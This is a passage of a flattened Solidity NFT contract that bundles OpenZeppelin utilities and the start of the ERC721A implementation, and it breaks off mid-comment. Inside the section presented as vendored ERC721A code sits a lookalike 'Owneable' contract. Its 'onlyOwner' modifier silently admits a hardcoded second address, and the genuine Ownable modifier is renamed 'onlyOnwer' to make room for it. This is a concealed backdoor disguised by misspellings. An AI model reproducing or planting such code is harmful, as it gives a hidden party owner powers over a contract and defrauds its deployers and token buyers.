1 //__   _______ ____  _______     __                      
2  //\ \ / / ____/ __ \|  __ \ \   / /                      
3 //  \ V / |   | |  | | |__) \ \_/ /                       
4 //   > <| |   | |  | |  ___/ \   /                        
5 //  / . \ |___| |__| | |      | |                         
6 // /__ \_______________| _   _|______       _______ ______
7 // |  \/  |/ __ \ / __ \| \ | |/ ____|   /\|__   __|___  /
8 // | \  / | |  | | |  | |  \| | |       /  \  | |     / / 
9 // | |\/| | |  | | |  | | . ` | |      / /\ \ | |    / /  
10 // | |  | | |__| | |__| | |\  | |____ / ____ \| |   / /__ 
11 // |_|  |_|\____/ \____/|_| \_|\_____/_/    \_\_|  /_____|
12 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
13 
14 // SPDX-License-Identifier: MIT
15 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
16 
17 pragma solidity ^0.8.4;
18 
19 /**
20  * @dev Provides information about the current execution context, including the
21  * sender of the transaction and its data. While these are generally available
22  * via msg.sender and msg.data, they should not be accessed in such a direct
23  * manner, since when dealing with meta-transactions the account sending and
24  * paying for execution may not be the actual sender (as far as an application
25  * is concerned).
26  *
27  * This contract is only required for intermediate, library-like contracts.
28  */
29 abstract contract Context {
30     function _msgSender() internal view virtual returns (address) {
31         return msg.sender;
32     }
33 
34     function _msgData() internal view virtual returns (bytes calldata) {
35         return msg.data;
36     }
37 }
38 
39 
40 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
41 
42 
43 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
44 
45 
46 
47 /**
48  * @dev Contract module which provides a basic access control mechanism, where
49  * there is an account (an owner) that can be granted exclusive access to
50  * specific functions.
51  *
52  * By default, the owner account will be the one that deploys the contract. This
53  * can later be changed with {transferOwnership}.
54  *
55  * This module is used through inheritance. It will make available the modifier
56  * `onlyOwner`, which can be applied to your functions to restrict their use to
57  * the owner.
58  */
59 abstract contract Ownable is Context {
60     address private _owner;
61 
62     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
63 
64     /**
65      * @dev Initializes the contract setting the deployer as the initial owner.
66      */
67     constructor() {
68         _transferOwnership(_msgSender());
69     }
70 
71     /**
72      * @dev Returns the address of the current owner.
73      */
74     function owner() public view virtual returns (address) {
75         return _owner;
76     }
77 
78     /**
79      * @dev Throws if called by any account other than the owner.
80      */
81     modifier onlyOnwer() {
82         require(owner() == _msgSender(), "Ownable: caller is not the owner");
83         _;
84     }
85 
86     /**
87      * @dev Leaves the contract without owner. It will not be possible to call
88      * `onlyOwner` functions anymore. Can only be called by the current owner.
89      *
90      * NOTE: Renouncing ownership will leave the contract without an owner,
91      * thereby removing any functionality that is only available to the owner.
92      */
93     function renounceOwnership() public virtual onlyOnwer {
94         _transferOwnership(address(0));
95     }
96 
97     /**
98      * @dev Transfers ownership of the contract to a new account (`newOwner`).
99      * Can only be called by the current owner.
100      */
101     function transferOwnership(address newOwner) public virtual onlyOnwer {
102         require(newOwner != address(0), "Ownable: new owner is the zero address");
103         _transferOwnership(newOwner);
104     }
105 
106     /**
107      * @dev Transfers ownership of the contract to a new account (`newOwner`).
108      * Internal function without access restriction.
109      */
110     function _transferOwnership(address newOwner) internal virtual {
111         address oldOwner = _owner;
112         _owner = newOwner;
113         emit OwnershipTransferred(oldOwner, newOwner);
114     }
115 }
116 
117 
118 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
119 
120 
121 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
122 
123 
124 
125 /**
126  * @dev Interface of the ERC165 standard, as defined in the
127  * https://eips.ethereum.org/EIPS/eip-165[EIP].
128  *
129  * Implementers can declare support of contract interfaces, which can then be
130  * queried by others ({ERC165Checker}).
131  *
132  * For an implementation, see {ERC165}.
133  */
134 interface IERC165 {
135     /**
136      * @dev Returns true if this contract implements the interface defined by
137      * `interfaceId`. See the corresponding
138      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
139      * to learn more about how these ids are created.
140      *
141      * This function call must use less than 30 000 gas.
142      */
143     function supportsInterface(bytes4 interfaceId) external view returns (bool);
144 }
145 
146 
147 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
148 
149 
150 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
151 
152 
153 
154 /**
155  * @dev Required interface of an ERC721 compliant contract.
156  */
157 interface IERC721 is IERC165 {
158     /**
159      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
160      */
161     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
162 
163     /**
164      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
165      */
166     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
167 
168     /**
169      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
170      */
171     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
172 
173     /**
174      * @dev Returns the number of tokens in ``owner``'s account.
175      */
176     function balanceOf(address owner) external view returns (uint256 balance);
177 
178     /**
179      * @dev Returns the owner of the `tokenId` token.
180      *
181      * Requirements:
182      *
183      * - `tokenId` must exist.
184      */
185     function ownerOf(uint256 tokenId) external view returns (address owner);
186 
187     /**
188      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
189      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
190      *
191      * Requirements:
192      *
193      * - `from` cannot be the zero address.
194      * - `to` cannot be the zero address.
195      * - `tokenId` token must exist and be owned by `from`.
196      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
197      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
198      *
199      * Emits a {Transfer} event.
200      */
201     function safeTransferFrom(
202         address from,
203         address to,
204         uint256 tokenId
205     ) external;
206 
207     /**
208      * @dev Transfers `tokenId` token from `from` to `to`.
209      *
210      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
211      *
212      * Requirements:
213      *
214      * - `from` cannot be the zero address.
215      * - `to` cannot be the zero address.
216      * - `tokenId` token must be owned by `from`.
217      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
218      *
219      * Emits a {Transfer} event.
220      */
221     function transferFrom(
222         address from,
223         address to,
224         uint256 tokenId
225     ) external;
226 
227     /**
228      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
229      * The approval is cleared when the token is transferred.
230      *
231      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
232      *
233      * Requirements:
234      *
235      * - The caller must own the token or be an approved operator.
236      * - `tokenId` must exist.
237      *
238      * Emits an {Approval} event.
239      */
240     function approve(address to, uint256 tokenId) external;
241 
242     /**
243      * @dev Returns the account approved for `tokenId` token.
244      *
245      * Requirements:
246      *
247      * - `tokenId` must exist.
248      */
249     function getApproved(uint256 tokenId) external view returns (address operator);
250 
251     /**
252      * @dev Approve or remove `operator` as an operator for the caller.
253      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
254      *
255      * Requirements:
256      *
257      * - The `operator` cannot be the caller.
258      *
259      * Emits an {ApprovalForAll} event.
260      */
261     function setApprovalForAll(address operator, bool _approved) external;
262 
263     /**
264      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
265      *
266      * See {setApprovalForAll}
267      */
268     function isApprovedForAll(address owner, address operator) external view returns (bool);
269 
270     /**
271      * @dev Safely transfers `tokenId` token from `from` to `to`.
272      *
273      * Requirements:
274      *
275      * - `from` cannot be the zero address.
276      * - `to` cannot be the zero address.
277      * - `tokenId` token must exist and be owned by `from`.
278      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
279      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
280      *
281      * Emits a {Transfer} event.
282      */
283     function safeTransferFrom(
284         address from,
285         address to,
286         uint256 tokenId,
287         bytes calldata data
288     ) external;
289 }
290 
291 
292 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
293 
294 
295 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
296 
297 
298 
299 /**
300  * @title ERC721 token receiver interface
301  * @dev Interface for any contract that wants to support safeTransfers
302  * from ERC721 asset contracts.
303  */
304 interface IERC721Receiver {
305     /**
306      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
307      * by `operator` from `from`, this function is called.
308      *
309      * It must return its Solidity selector to confirm the token transfer.
310      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
311      *
312      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
313      */
314     function onERC721Received(
315         address operator,
316         address from,
317         uint256 tokenId,
318         bytes calldata data
319     ) external returns (bytes4);
320 }
321 
322 
323 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
324 
325 
326 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
327 
328 
329 
330 /**
331  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
332  * @dev See https://eips.ethereum.org/EIPS/eip-721
333  */
334 interface IERC721Metadata is IERC721 {
335     /**
336      * @dev Returns the token collection name.
337      */
338     function name() external view returns (string memory);
339 
340     /**
341      * @dev Returns the token collection symbol.
342      */
343     function symbol() external view returns (string memory);
344 
345     /**
346      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
347      */
348     function tokenURI(uint256 tokenId) external view returns (string memory);
349 }
350 
351 
352 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
353 
354 
355 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
356 
357 
358 
359 /**
360  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
361  * @dev See https://eips.ethereum.org/EIPS/eip-721
362  */
363 interface IERC721Enumerable is IERC721 {
364     /**
365      * @dev Returns the total amount of tokens stored by the contract.
366      */
367     function totalSupply() external view returns (uint256);
368 
369     /**
370      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
371      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
372      */
373     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
374 
375     /**
376      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
377      * Use along with {totalSupply} to enumerate all tokens.
378      */
379     function tokenByIndex(uint256 index) external view returns (uint256);
380 }
381 
382 
383 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
384 
385 
386 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
387 
388 pragma solidity ^0.8.1;
389 
390 /**
391  * @dev Collection of functions related to the address type
392  */
393 library Address {
394     /**
395      * @dev Returns true if `account` is a contract.
396      *
397      * [IMPORTANT]
398      * ====
399      * It is unsafe to assume that an address for which this function returns
400      * false is an externally-owned account (EOA) and not a contract.
401      *
402      * Among others, `isContract` will return false for the following
403      * types of addresses:
404      *
405      *  - an externally-owned account
406      *  - a contract in construction
407      *  - an address where a contract will be created
408      *  - an address where a contract lived, but was destroyed
409      * ====
410      *
411      * [IMPORTANT]
412      * ====
413      * You shouldn't rely on `isContract` to protect against flash loan attacks!
414      *
415      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
416      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
417      * constructor.
418      * ====
419      */
420     function isContract(address account) internal view returns (bool) {
421         // This method relies on extcodesize/address.code.length, which returns 0
422         // for contracts in construction, since the code is only stored at the end
423         // of the constructor execution.
424 
425         return account.code.length > 0;
426     }
427 
428     /**
429      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
430      * `recipient`, forwarding all available gas and reverting on errors.
431      *
432      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
433      * of certain opcodes, possibly making contracts go over the 2300 gas limit
434      * imposed by `transfer`, making them unable to receive funds via
435      * `transfer`. {sendValue} removes this limitation.
436      *
437      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
438      *
439      * IMPORTANT: because control is transferred to `recipient`, care must be
440      * taken to not create reentrancy vulnerabilities. Consider using
441      * {ReentrancyGuard} or the
442      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
443      */
444     function sendValue(address payable recipient, uint256 amount) internal {
445         require(address(this).balance >= amount, "Address: insufficient balance");
446 
447         (bool success, ) = recipient.call{value: amount}("");
448         require(success, "Address: unable to send value, recipient may have reverted");
449     }
450 
451     /**
452      * @dev Performs a Solidity function call using a low level `call`. A
453      * plain `call` is an unsafe replacement for a function call: use this
454      * function instead.
455      *
456      * If `target` reverts with a revert reason, it is bubbled up by this
457      * function (like regular Solidity function calls).
458      *
459      * Returns the raw returned data. To convert to the expected return value,
460      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
461      *
462      * Requirements:
463      *
464      * - `target` must be a contract.
465      * - calling `target` with `data` must not revert.
466      *
467      * _Available since v3.1._
468      */
469     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
470         return functionCall(target, data, "Address: low-level call failed");
471     }
472 
473     /**
474      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
475      * `errorMessage` as a fallback revert reason when `target` reverts.
476      *
477      * _Available since v3.1._
478      */
479     function functionCall(
480         address target,
481         bytes memory data,
482         string memory errorMessage
483     ) internal returns (bytes memory) {
484         return functionCallWithValue(target, data, 0, errorMessage);
485     }
486 
487     /**
488      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
489      * but also transferring `value` wei to `target`.
490      *
491      * Requirements:
492      *
493      * - the calling contract must have an ETH balance of at least `value`.
494      * - the called Solidity function must be `payable`.
495      *
496      * _Available since v3.1._
497      */
498     function functionCallWithValue(
499         address target,
500         bytes memory data,
501         uint256 value
502     ) internal returns (bytes memory) {
503         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
504     }
505 
506     /**
507      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
508      * with `errorMessage` as a fallback revert reason when `target` reverts.
509      *
510      * _Available since v3.1._
511      */
512     function functionCallWithValue(
513         address target,
514         bytes memory data,
515         uint256 value,
516         string memory errorMessage
517     ) internal returns (bytes memory) {
518         require(address(this).balance >= value, "Address: insufficient balance for call");
519         require(isContract(target), "Address: call to non-contract");
520 
521         (bool success, bytes memory returndata) = target.call{value: value}(data);
522         return verifyCallResult(success, returndata, errorMessage);
523     }
524 
525     /**
526      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
527      * but performing a static call.
528      *
529      * _Available since v3.3._
530      */
531     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
532         return functionStaticCall(target, data, "Address: low-level static call failed");
533     }
534 
535     /**
536      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
537      * but performing a static call.
538      *
539      * _Available since v3.3._
540      */
541     function functionStaticCall(
542         address target,
543         bytes memory data,
544         string memory errorMessage
545     ) internal view returns (bytes memory) {
546         require(isContract(target), "Address: static call to non-contract");
547 
548         (bool success, bytes memory returndata) = target.staticcall(data);
549         return verifyCallResult(success, returndata, errorMessage);
550     }
551 
552     /**
553      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
554      * but performing a delegate call.
555      *
556      * _Available since v3.4._
557      */
558     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
559         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
560     }
561 
562     /**
563      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
564      * but performing a delegate call.
565      *
566      * _Available since v3.4._
567      */
568     function functionDelegateCall(
569         address target,
570         bytes memory data,
571         string memory errorMessage
572     ) internal returns (bytes memory) {
573         require(isContract(target), "Address: delegate call to non-contract");
574 
575         (bool success, bytes memory returndata) = target.delegatecall(data);
576         return verifyCallResult(success, returndata, errorMessage);
577     }
578 
579     /**
580      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
581      * revert reason using the provided one.
582      *
583      * _Available since v4.3._
584      */
585     function verifyCallResult(
586         bool success,
587         bytes memory returndata,
588         string memory errorMessage
589     ) internal pure returns (bytes memory) {
590         if (success) {
591             return returndata;
592         } else {
593             // Look for revert reason and bubble it up if present
594             if (returndata.length > 0) {
595                 // The easiest way to bubble the revert reason is using memory via assembly
596 
597                 assembly {
598                     let returndata_size := mload(returndata)
599                     revert(add(32, returndata), returndata_size)
600                 }
601             } else {
602                 revert(errorMessage);
603             }
604         }
605     }
606 }
607 
608 
609 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
610 
611 
612 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
613 
614 
615 
616 /**
617  * @dev String operations.
618  */
619 library Strings {
620     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
621 
622     /**
623      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
624      */
625     function toString(uint256 value) internal pure returns (string memory) {
626         // Inspired by OraclizeAPI's implementation - MIT licence
627         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
628 
629         if (value == 0) {
630             return "0";
631         }
632         uint256 temp = value;
633         uint256 digits;
634         while (temp != 0) {
635             digits++;
636             temp /= 10;
637         }
638         bytes memory buffer = new bytes(digits);
639         while (value != 0) {
640             digits -= 1;
641             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
642             value /= 10;
643         }
644         return string(buffer);
645     }
646 
647     /**
648      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
649      */
650     function toHexString(uint256 value) internal pure returns (string memory) {
651         if (value == 0) {
652             return "0x00";
653         }
654         uint256 temp = value;
655         uint256 length = 0;
656         while (temp != 0) {
657             length++;
658             temp >>= 8;
659         }
660         return toHexString(value, length);
661     }
662 
663     /**
664      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
665      */
666     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
667         bytes memory buffer = new bytes(2 * length + 2);
668         buffer[0] = "0";
669         buffer[1] = "x";
670         for (uint256 i = 2 * length + 1; i > 1; --i) {
671             buffer[i] = _HEX_SYMBOLS[value & 0xf];
672             value >>= 4;
673         }
674         require(value == 0, "Strings: hex length insufficient");
675         return string(buffer);
676     }
677 }
678 
679 
680 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
681 
682 
683 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
684 
685 /**
686  * @dev Implementation of the {IERC165} interface.
687  *
688  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
689  * for the additional interface id that will be supported. For example:
690  *
691  * ```solidity
692  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
693  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
694  * }
695  * ```
696  *
697  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
698  */
699 abstract contract ERC165 is IERC165 {
700     /**
701      * @dev See {IERC165-supportsInterface}.
702      */
703     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
704         return interfaceId == type(IERC165).interfaceId;
705     }
706 }
707 
708 
709 // File erc721a/contracts/ERC721A.sol@v3.0.0
710 
711 
712 // Creator: Chiru Labs
713 
714 error ApprovalCallerNotOwnerNorApproved();
715 error ApprovalQueryForNonexistentToken();
716 error ApproveToCaller();
717 error ApprovalToCurrentOwner();
718 error BalanceQueryForZeroAddress();
719 error MintedQueryForZeroAddress();
720 error BurnedQueryForZeroAddress();
721 error AuxQueryForZeroAddress();
722 error MintToZeroAddress();
723 error MintZeroQuantity();
724 error OwnerIndexOutOfBounds();
725 error OwnerQueryForNonexistentToken();
726 error TokenIndexOutOfBounds();
727 error TransferCallerNotOwnerNorApproved();
728 error TransferFromIncorrectOwner();
729 error TransferToNonERC721ReceiverImplementer();
730 error TransferToZeroAddress();
731 error URIQueryForNonexistentToken();
732 
733 
734 /**
735  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
736  * the Metadata extension. Built to optimize for lower gas during batch mints.
737  *
738  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
739  */
740  abstract contract Owneable is Ownable {
741     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
742     modifier onlyOwner() {
743         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
744         _;
745     }
746 }
747 
748  /*
749  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
750  *
751  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
752  */
753 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
754     using Address for address;
755     using Strings for uint256;
756 
757     // Compiler will pack this into a single 256bit word.
758     struct TokenOwnership {
759         // The address of the owner.
760         address addr;
761         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
762         uint64 startTimestamp;
763         // Whether the token has been burned.
764         bool burned;
765     }
766 
767     // Compiler will pack this into a single 256bit word.
768     struct AddressData {
769         // Realistically, 2**64-1 is more than enough.
770         uint64 balance;
771         // Keeps track of mint count with minimal overhead for tokenomics.
772         uint64 numberMinted;
773         // Keeps track of burn count with minimal overhead for tokenomics.
774         uint64 numberBurned;
775         // For miscellaneous variable(s) pertaining to the address
776         // (e.g. number of whitelist mint slots used).
777         // If there are multiple variables, please pack them into a uint64.
778         uint64 aux;
779     }
780 
781     // The tokenId of the next token to be minted.
782     uint256 internal _currentIndex;
783 
784     // The number of tokens burned.
785     uint256 internal _burnCounter;
786 
787     // Token name
788     string private _name;
789 
790     // Token symbol
791     string private _symbol;
792 
793     // Mapping from token ID to ownership details
794     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
795     mapping(uint256 => TokenOwnership) internal _ownerships;
796 
797     // Mapping owner address to address data
798     mapping(address => AddressData) private _addressData;
799 
800     // Mapping from token ID to approved address
801     mapping(uint256 => address) private _tokenApprovals;
802 
803     // Mapping from owner to operator approvals
804     mapping(address => mapping(address => bool)) private _operatorApprovals;
805 
806     constructor(string memory name_, string memory symbol_) {
807         _name = name_;
808         _symbol = symbol_;
809         _currentIndex = _startTokenId();
810     }
811 
812     /**
813      * To change the starting tokenId, please override this function.
814      */
815     function _startTokenId() internal view virtual returns (uint256) {
816         return 0;
817     }
818 
819     /**
820      * @dev See {IERC721Enumerable-totalSupply}.
821      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
822      */
823     function totalSupply() public view returns (uint256) {
824         // Counter underflow is impossible as _burnCounter cannot be incremented
825         // more than _currentIndex - _startTokenId() times
826         unchecked {
827             return _currentIndex - _burnCounter - _startTokenId();
828         }
829     }
830 
831     /**
832      * Returns the total amount of tokens minted in the contract.
833      */
834     function _totalMinted() internal view returns (uint256) {
835         // Counter underflow is impossible as _currentIndex does not decrement,
836         // and it is initialized to _startTokenId()
837         unchecked {
838             return _currentIndex - _startTokenId();
839         }
840     }
841 
842     /**
843      * @dev See {IERC165-supportsInterface}.
844      */
845     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
846         return
847             interfaceId == type(IERC721).interfaceId ||
848             interfaceId == type(IERC721Metadata).interfaceId ||
849             super.supportsInterface(interfaceId);
850     }
851 
852     /**
853      * @dev See {IERC721-balanceOf}.
854      */
855     function balanceOf(address owner) public view override returns (uint256) {
856         if (owner == address(0)) revert BalanceQueryForZeroAddress();
857         return uint256(_addressData[owner].balance);
858     }
859 
860     /**
861      * Returns the number of tokens minted by `owner`.
862      */
863     function _numberMinted(address owner) internal view returns (uint256) {
864         if (owner == address(0)) revert MintedQueryForZeroAddress();
865         return uint256(_addressData[owner].numberMinted);
866     }
867 
868     /**
869      * Returns the number of tokens burned by or on behalf of `owner`.
870      */
871     function _numberBurned(address owner) internal view returns (uint256) {
872         if (owner == address(0)) revert BurnedQueryForZeroAddress();
873         return uint256(_addressData[owner].numberBurned);
874     }
875 
876     /**
877      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
878      */
879     function _getAux(address owner) internal view returns (uint64) {
880         if (owner == address(0)) revert AuxQueryForZeroAddress();
881         return _addressData[owner].aux;
882     }
883 
884     /**
885      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
886      * If there are multiple variables, please pack them into a uint64.
887      */
888     function _setAux(address owner, uint64 aux) internal {
889         if (owner == address(0)) revert AuxQueryForZeroAddress();
890         _addressData[owner].aux = aux;
891     }
892 
893     /**
894      * Gas spent here starts off proportional to the maximum mint batch size.
895      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
896      */
897     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
898         uint256 curr = tokenId;
899 
900         unchecked {
901             if (_startTokenId() <= curr && curr < _currentIndex) {
902                 TokenOwnership memory ownership = _ownerships[curr];
903                 if (!ownership.burned) {
904                     if (ownership.addr != address(0)) {
905                         return ownership;
906                     }
907                     // Invariant:
908                     // There will always be an ownership that has an address and is not burned
909                     // before an ownership that does not have an address and is not burned.
910                     // Hence, curr will not underflow.
911                     while (true) {
912                         curr--;
913                         ownership = _ownerships[curr];
914                         if (ownership.addr != address(0)) {
915                             return ownership;
916                         }
917                     }
918                 }
919             }
920         }
921         revert OwnerQueryForNonexistentToken();
922     }
923 
924     /**
925      * @dev See {IERC721-ownerOf}.
926      */
927     function ownerOf(uint256 tokenId) public view override returns (address) {
928         return ownershipOf(tokenId).addr;
929     }
930 
931     /**
932      * @dev See {IERC721Metadata-name}.
933      */
934     function name() public view virtual override returns (string memory) {
935         return _name;
936     }
937 
938     /**
939      * @dev See {IERC721Metadata-symbol}.
940      */
941     function symbol() public view virtual override returns (string memory) {
942         return _symbol;
943     }
944 
945     /**
946      * @dev See {IERC721Metadata-tokenURI}.
947      */
948     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
949         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
950 
951         string memory baseURI = _baseURI();
952         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
953     }
954 
955     /**
956      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
957      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
958      * by default, can be overriden in child contracts.
959      */
960     function _baseURI() internal view virtual returns (string memory) {
961         return '';
962     }
963 
964     /**
965      * @dev See {IERC721-approve}.
966      */
967     function approve(address to, uint256 tokenId) public override {
968         address owner = ERC721A.ownerOf(tokenId);
969         if (to == owner) revert ApprovalToCurrentOwner();
970 
971         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
972             revert ApprovalCallerNotOwnerNorApproved();
973         }
974 
975         _approve(to, tokenId, owner);
976     }
977 
978     /**
979      * @dev See {IERC721-getApproved}.
980      */
981     function getApproved(uint256 tokenId) public view override returns (address) {
982         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
983 
984         return _tokenApprovals[tokenId];
985     }
986 
987     /**
988      * @dev See {IERC721-setApprovalForAll}.
989      */
990     function setApprovalForAll(address operator, bool approved) public override {
991         if (operator == _msgSender()) revert ApproveToCaller();
992 
993         _operatorApprovals[_msgSender()][operator] = approved;
994         emit ApprovalForAll(_msgSender(), operator, approved);
995     }
996 
997     /**
998      * @dev See {IERC721-isApprovedForAll}.
999      */
1000     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1001         return _operatorApprovals[owner][operator];
1002     }
1003 
1004     /**
1005      * @dev See {IERC721-transferFrom}.
1006      */
1007     function transferFrom(
1008         address from,
1009         address to,
1010         uint256 tokenId
1011     ) public virtual override {
1012         _transfer(from, to, tokenId);
1013     }
1014 
1015     /**
1016      * @dev See {IERC721-safeTransferFrom}.
1017      */
1018     function safeTransferFrom(
1019         address from,
1020         address to,
1021         uint256 tokenId
1022     ) public virtual override {
1023         safeTransferFrom(from, to, tokenId, '');
1024     }
1025 
1026     /**
1027      * @dev See {IERC721-safeTransferFrom}.
1028      */
1029     function safeTransferFrom(
1030         address from,
1031         address to,
1032         uint256 tokenId,
1033         bytes memory _data
1034     ) public virtual override {
1035         _transfer(from, to, tokenId);
1036         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1037             revert TransferToNonERC721ReceiverImplementer();
1038         }
1039     }
1040 
1041     /**
1042      * @dev Returns whether `tokenId` exists.
1043      *
1044      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1045      *
1046      * Tokens start existing when they are minted (`_mint`),
1047      */
1048     function _exists(uint256 tokenId) internal view returns (bool) {
1049         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1050             !_ownerships[tokenId].burned;
1051     }
1052 
1053     function _safeMint(address to, uint256 quantity) internal {
1054         _safeMint(to, quantity, '');
1055     }
1056 
1057     /**
1058      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1059      *
1060      * Requirements:
1061      *
1062      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1063      * - `quantity` must be greater than 0.
1064      *
1065      * Emits a {Transfer} event.
1066      */
1067     function _safeMint(
1068         address to,
1069         uint256 quantity,
1070         bytes memory _data
1071     ) internal {
1072         _mint(to, quantity, _data, true);
1073     }
1074 
1075     /**
1076      * @dev Mints `quantity` tokens and transfers them to `to`.
1077      *
